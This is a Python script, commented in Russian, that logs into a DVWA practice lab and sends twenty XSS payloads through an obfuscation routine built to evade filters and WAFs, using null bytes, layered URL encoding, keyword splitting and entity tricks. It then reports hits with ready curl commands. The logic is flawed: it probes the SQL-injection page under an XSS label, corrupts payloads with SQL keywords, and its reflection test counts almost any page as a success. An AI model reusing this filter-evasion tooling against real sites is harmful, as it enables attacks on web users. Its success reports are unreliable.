import sys
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, quote_plus, unquote_plus
import random
import string
import base64
import time
import re

BASE = "http://dvwa.local"
USERNAME = "admin"
PASSWORD = "password"
TIMEOUT = 10

s = requests.Session()
HEADERS = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64)",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
}

payloads = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>", 
    "<body onload=alert(1)>",
    "<iframe src=\"javascript:alert(1)\">",
    "<a href=\"javascript:alert(1)\">click</a>",
    "<input onfocus=alert(1) autofocus>",
    "<details open ontoggle=alert(1)>",
    "<marquee onstart=alert(1)>",
    "\"><script>alert(1)</script>",
    "' onmouseover=alert(1) '",
    "<x onclick=\"alert(1)\">click</x>",
    "<div style=\"background:url('javascript:alert(1)')\">",
    "<object data=\"javascript:alert(1)\">",
    "<embed src=\"data:text/html,<script>alert(1)</script>\">",
    "<form action=\"javascript:alert(1)\"><input type=submit>",
    "<isindex action=\"javascript:alert(1)\" type=image>",
    "<xss style=\"background:url('javascript:alert(1)')\">",
    "<math><brute href=\"javascript:alert(1)\">click</brute></math>",
    "<video><source onerror=\"javascript:alert(1)\">"
]

def quantum_obfuscate_payload(payload):
    """
    Квантовая обфускация XSS с максимальным уровнем скрытия
    """
    # Техника 1: Полное разбиение на части с невидимыми символами
    parts = []
    current = ""
    for char in payload:
        if random.random() < 0.3 and current:  # 30% шанс разбить
            parts.append(current)
            current = char
        else:
            current += char
    if current:
        parts.append(current)
    
    # Добавляем невидимые символы между частями
    invisible_chars = ['%00', '%01', '%02', '%03', '%04', '%05', '%06', '%07', '%08', '%0B', '%0C', '%0E', '%0F',
                      '%10', '%11', '%12', '%13', '%14', '%15', '%16', '%17', '%18', '%19', '%1A', '%1B', '%1C', '%1D', '%1E', '%1F']
    
    obfuscated = ""
    for i, part in enumerate(parts):
        obfuscated += part
        if i < len(parts) - 1:
            obfuscated += random.choice(invisible_chars)
    
    # Техника 2: Многократное URL-кодирование
    for _ in range(random.randint(1, 3)):
        obfuscated = quote_plus(obfuscated, safe='')
    
    # Техника 3: Замена ключевых слов на альтернативные формы
    replacements = {
        "script": ["scr" + "ipt", "sc" + "ript", "s" + "cript", "%73%63%72%69%70%74"],
        "javascript": ["java" + "script", "jav" + "ascript", "j" + "avascript", "%6A%61%76%61%73%63%72%69%70%74"],
        "alert": ["al" + "ert", "a" + "lert", "%61%6C%65%72%74"],
        "onerror": ["on" + "error", "oner" + "ror", "%6F%6E%65%72%72%6F%72"],
        "onload": ["on" + "load", "onl" + "oad", "%6F%6E%6C%6F%61%64"],
        "onclick": ["on" + "click", "oncl" + "ick", "%6F%6E%63%6C%69%63%6B"],
        "=": [" LIKE ", " REGEXP ", " IN ", "%3D", "%3d"],
        "1": ["0x31", "true", "1%2B0", "%31"],
        "'": ["%27", "%u0027", "%2527", "/*'*/"],
        "\"": ["%22", "%u0022", "%2522", "/*\"*/"],
        " ": ["%20", "%09", "%0A", "%0D", "/**/"]
    }
    
    for key, variations in replacements.items():
        if key in payload.lower():
            obfuscated = obfuscated.replace(key, random.choice(variations))
    
    # Техника 4: Добавление случайных комментариев HTML/JS
    html_comments = ["<!--", "-->", "<![CDATA[", "]]>"]
    js_comments = ["/*", "*/", "//"]
    
    if any(tag in payload for tag in ["<script>", "<img", "<svg", "<body"]):
        if random.random() < 0.6:
            comment_type = random.choice(html_comments + js_comments)
            if comment_type in ["<!--", "<![CDATA["]:
                obfuscated = comment_type + obfuscated + random.choice(["-->" if comment_type == "<!--" else "]]>"])
    
    # Техника 5: Случайный регистр с сохранением функциональности
    result = ""
    for char in obfuscated:
        if char.isalpha():
            result += char.upper() if random.choice([True, False]) else char.lower()
        else:
            result += char
    
    # Техника 6: Добавление мусорных атрибутов
    garbage_attrs = ["", " data-x=\"1\"", " class=\"test\"", " id=\"x\"", " style=\"display:block\""]
    if any(tag in payload for tag in ["<img", "<div", "<input", "<object"]):
        if random.random() < 0.5:
            result = result.replace(">", random.choice(garbage_attrs) + ">")
    
    # Техника 7: Использование разных кодировок
    encodings = ["", "&#x3C;", "&#60;", "&lt;"]
    if payload.startswith("<"):
        if random.random() < 0.4:
            result = random.choice(encodings) + result[1:]
    
    return result

def check_payload_reflection(response_text, original_payload, obfuscated_payload):
    """
    Улучшенная проверка отражения payload'а в ответе
    """
    # Декодируем ответ для поиска
    decoded_response = unquote_plus(response_text)
    
    # Ищем различные варианты отражения payload'а
    reflection_indicators = [
        # 1. Оригинальный payload (может быть декодирован сервером)
        original_payload.lower() in decoded_response.lower(),
        
        # 2. Части оригинального payload'а
        any(keyword.lower() in decoded_response.lower() for keyword in 
            ["script", "alert", "onerror", "onload", "javascript:", "src=", "href="]),
        
        # 3. Проверяем отражение в различных формах
        re.search(r'<[^>]*script[^>]*>', decoded_response, re.IGNORECASE) is not None,
        re.search(r'alert\s*\(', decoded_response, re.IGNORECASE) is not None,
        re.search(r'on\w+=', decoded_response, re.IGNORECASE) is not None,
    ]
    
    # Дополнительная проверка для конкретных типов payload'ов
    if "<script>" in original_payload:
        reflection_indicators.append("script" in decoded_response.lower())
    if "alert" in original_payload:
        reflection_indicators.append("alert" in decoded_response.lower())
    if "javascript:" in original_payload:
        reflection_indicators.append("javascript:" in decoded_response.lower())
    
    # Если есть хотя бы один индикатор отражения
    return any(reflection_indicators)

def get_login_form_and_action(html, base_url):
    soup = BeautifulSoup(html, "html.parser")
    form = soup.find("form")
    if not form:
        return None, None
    action = form.get("action") or ""
    action = urljoin(base_url, action)
    inputs = {}
    for inp in form.find_all("input"):
        name = inp.get("name")
        if not name:
            continue
        inputs[name] = inp.get("value", "")
    return action, inputs

def extract_csrf_from_html(html):
    soup = BeautifulSoup(html, "html.parser")
    el = soup.find("input", {"name": "csrftoken"})
    if el and el.has_attr("value"):
        return el["value"]
    for candidate in ("user_token", "token", "security_token"):
        el2 = soup.find("input", {"name": candidate})
        if el2 and el2.has_attr("value"):
            return el2["value"]
    return None

def main():
    print("=" * 80)
    print("DVWA XSS INJECTION TESTER WITH DETAILED DEBUG INFO")
    print("=" * 80)
    
    login_url = urljoin(BASE, "/login.php")
    print(f"\n[1/4] 🔐 LOGIN PHASE")
    print(f"Target: {login_url}")

    # 1) GET login page
    try:
        r = s.get(login_url, headers=HEADERS, timeout=TIMEOUT)
        print(f"✅ GET {login_url} -> {r.status_code}")
    except Exception as e:
        print(f"❌ GET {login_url} -> ERROR: {e}")
        sys.exit(1)

    action, inputs = get_login_form_and_action(r.text, login_url)
    if not action:
        print("❌ ERROR: login form not found")
        sys.exit(2)

    payload_login = inputs.copy()
    payload_login["username"] = USERNAME
    payload_login["password"] = PASSWORD

    post_headers = HEADERS.copy()
    post_headers["Referer"] = login_url

    # 2) POST login
    print(f"🔑 Logging in as {USERNAME}:{PASSWORD}")
    r_post = s.post(action, data=payload_login, headers=post_headers, allow_redirects=False, timeout=TIMEOUT)
    print(f"✅ POST {action} -> {r_post.status_code}")
    
    if r_post.status_code in (301,302,303,307,308,403,500):
        loc = r_post.headers.get("Location")
        print(f"🔄 Redirect to: {loc}")
        next_url = urljoin(action, loc) if loc else urljoin(BASE, "/index.php")
        r_after = s.get(next_url, headers=HEADERS, allow_redirects=True, timeout=TIMEOUT)
        print(f"✅ After redirect -> {r_after.status_code} | URL: {r_after.url}")
    else:
        r_after = r_post
        print(f"ℹ  No redirect after POST")

    # Check cookies
    if s.cookies:
        print("🍪 Cookies obtained:")
        for k, v in s.cookies.items():
            print(f"   {k} = {v}")
    else:
        print("❌ No cookies after login")

    # 3) Get XSS page for CSRF token
    print(f"\n[2/4] 🔍 GETTING CSRF TOKEN")
    xss_page_url = urljoin(BASE, "/vulnerabilities/sqli/")
    print(f"Target: {xss_page_url}")
    
    try:
        r_xss = s.get(xss_page_url, headers={"Referer": r_after.url, **HEADERS}, allow_redirects=True, timeout=TIMEOUT)
        print(f"✅ GET {xss_page_url} -> {r_xss.status_code} | Final URL: {r_xss.url}")
    except Exception as e:
        print(f"❌ GET {xss_page_url} -> ERROR: {e}")
        # Попробуем стандартный XSS путь DVWA
        xss_page_url = urljoin(BASE, "/vulnerabilities/sqli/")
        print(f"🔄 Trying alternative: {xss_page_url}")
        try:
            r_xss = s.get(xss_page_url, headers={"Referer": r_after.url, **HEADERS}, allow_redirects=True, timeout=TIMEOUT)
            print(f"✅ GET {xss_page_url} -> {r_xss.status_code} | Final URL: {r_xss.url}")
        except Exception as e2:
            print(f"❌ GET {xss_page_url} -> ERROR: {e2}")
            sys.exit(4)

    csrftoken = extract_csrf_from_html(r_xss.text)
    if not csrftoken:
        print("❌ ERROR: csrftoken not found on XSS page")
        sys.exit(5)
    
    print(f"✅ CSRF Token: {csrftoken[:20]}...")

    # 4) Test payloads with quantum obfuscation
    print(f"\n[3/4] 🚀 TESTING PAYLOADS")
    print("=" * 80)
    
    successful_payloads = []
    
    for idx, original_payload in enumerate(payloads, start=1):
        print(f"\n🎯 [{idx}/{len(payloads)}] Testing: {original_payload}")
        
        # 3 попытки с разной обфускацией для каждого payload
        for attempt in range(3):
            obfuscated_payload = quantum_obfuscate_payload(original_payload)
            
            # Дополнительное кодирование для URL
            encoded_payload = quote_plus(obfuscated_payload, safe='')
            
            # Пробуем разные параметры для XSS в DVWA
            target_urls = [
                f"{BASE}/vulnerabilities/sqli/?id=3{encoded_payload}&Submit=Submit&csrftoken={csrftoken}"
            ]
            
            target_url = target_urls[0]  # Основной URL
            
            print(f"   🔄 Attempt {attempt+1}:")
            print(f"      Obfuscated: {obfuscated_payload[:80]}{'...' if len(obfuscated_payload) > 80 else ''}")
            print(f"      URL: {target_url[:100]}{'...' if len(target_url) > 100 else ''}")

            # Выполняем запрос
            target_headers = HEADERS.copy()
            target_headers["Referer"] = r_xss.url

            try:
                start_time = time.time()
                r_target = s.get(target_url, headers=target_headers, allow_redirects=False, timeout=TIMEOUT)
                response_time = time.time() - start_time
                
                status_icon = "✅" if r_target.status_code == 200 else "⚠" if r_target.status_code in (301, 302, 303, 307, 308) else "❌"
                
                print(f"      {status_icon} Response: {r_target.status_code} | Size: {len(r_target.content)} bytes | Time: {response_time:.2f}s")
                
                if r_target.status_code == 200:
                    # Улучшенная проверка отражения payload'а
                    is_reflected = check_payload_reflection(r_target.text, original_payload, obfuscated_payload)
                    
                    if is_reflected:
                        print(f"      🎉 SUCCESS! Payload reflected!")
                        
                        # Проверяем содержание ответа
                        content_preview = r_target.text[:200].replace('\n', ' ').replace('\r', ' ')
                        print(f"      📄 Content preview: {content_preview}...")
                        
                        successful_payloads.append((original_payload, obfuscated_payload, target_url, len(r_target.content)))
                        break  # Переходим к следующему payload
                    else:
                        print(f"      ⚠ Payload not reflected in response")
                        
                elif r_target.status_code in (301, 302, 303, 307, 308):
                    redirect_url = r_target.headers.get('Location', 'Unknown')
                    print(f"      🔄 Redirected to: {redirect_url}")
                    
                elif r_target.status_code == 403:
                    print(f"      🚫 BLOCKED by WAF")
                    
            except Exception as e:
                print(f"      💥 Request failed: {str(e)}")

    # 5) Final summary with detailed results
    print(f"\n[4/4] 📊 FINAL RESULTS")
    print("=" * 80)
    
    if successful_payloads:
        print(f"🎉 SUCCESS: {len(successful_payloads)}/{len(payloads)} payloads worked!")
        print("\n" + "=" * 60)
        print("SUCCESSFUL PAYLOADS DETAILS:")
        print("=" * 60)
        
        for i, (orig, obf, url, size) in enumerate(successful_payloads, 1):
            print(f"\n{i}. ORIGINAL: {orig}")
            print(f"   OBFUSCATED: {obf}")
            print(f"   URL: {url}")
            print(f"   RESPONSE SIZE: {size} bytes")
            print(f"   TEST LINK: curl -s -b 'PHPSESSID={s.cookies.get('PHPSESSID', '')}' '{url}'")
            
    else:
        print("❌ No successful payloads found")
    
    success_rate = (len(successful_payloads) / len(payloads)) * 100
    print(f"\n" + "=" * 60)
    print(f"OVERALL SUCCESS RATE: {success_rate:.1f}% ({len(successful_payloads)}/{len(payloads)})")
    
    if successful_payloads:
        print(f"\n💡 QUICK TEST COMMANDS:")
        for i, (orig, obf, url, size) in enumerate(successful_payloads[:3], 1):  # Показываем первые 3
            short_url = url.split('?')[1][:50] + "..." if len(url.split('?')[1]) > 50 else url.split('?')[1]
            print(f"{i}. curl -s -o /dev/null -w '%{{http_code}}' '{BASE}/vulnerabilities/xss_r/?{short_url}'")

if __name__ == "__main__":
    main()
